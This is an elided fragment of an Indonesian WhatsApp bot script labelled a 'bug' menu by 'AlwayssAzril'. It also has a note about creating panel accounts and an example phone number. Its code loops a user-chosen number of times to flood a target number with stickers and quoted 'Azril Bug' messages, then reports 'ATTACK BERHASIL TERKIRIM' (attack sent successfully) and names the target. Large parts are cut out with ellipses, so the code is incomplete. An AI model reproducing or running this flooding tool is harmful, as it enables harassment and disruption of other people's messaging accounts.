Ridho.exports = async (Biiofc, m, store) => {
try {
...
contoh : 1gb Azril,6282193421753
...
_LIST MENU BUG BY *© AlwayssAzril*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
...
*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT AlwayssAzril BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT AlwayssAzril
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "Azril Bug🔥", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "Azril Bug🔥", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { text: "Azril Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(mnm, { text: "Azril Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
